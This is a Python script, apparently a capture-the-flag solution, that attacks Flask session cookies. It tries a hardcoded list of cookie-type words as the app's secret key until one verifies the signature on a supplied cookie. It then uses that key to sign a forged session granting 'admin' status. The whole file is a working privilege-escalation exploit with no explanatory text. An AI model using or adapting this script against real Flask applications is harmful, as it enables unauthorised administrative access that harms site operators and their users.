import flask
import hashlib

from sys import argv
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

cookie = argv[1]

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", 
"shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", 
"biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", 
"wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", 
"lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

real_secret = ''

for secret in cookie_names:
    try:
        serializer = URLSafeTimedSerializer(
            secret_key=secret,  
            salt='cookie-session',
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation' : 'hmac',
                'digest_method' : hashlib.sha1
        }).loads(cookie)
    except BadSignature:
        continue

    print(f'Secret key: {secret}')
    real_secret = secret

session = {'very_auth' : 'admin'}

print(URLSafeTimedSerializer(
    secret_key=real_secret,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation' : 'hmac',
        'digest_method' : hashlib.sha1
    }
).dumps(session))